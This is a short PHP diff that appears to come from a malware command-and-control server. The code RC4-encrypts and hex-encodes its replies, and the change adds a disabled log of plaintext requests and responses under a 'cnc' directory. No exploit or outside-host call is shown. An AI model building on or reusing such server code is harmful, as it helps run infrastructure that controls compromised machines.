@@ -104,7 +104,14 @@ function main() {
 				$response = '{1}';
 			}
 
-			echo bin2hex(rc4($key, $response));
+			$final_response = bin2hex(rc4($key, $response));
+			echo $final_response;
+
+			$should_log = false;
+			if($should_log) {
+				$log_entry = "GET Param: $param, POST Data: $name=$value\nResponse: $final_response\nPlaintext request: $plaintext\nPlaintext response: $response\n\n";
+				file_put_contents("/home/cnc/requests.log", $log_entry, FILE_APPEND);
+			}
 		}
 	}
 }
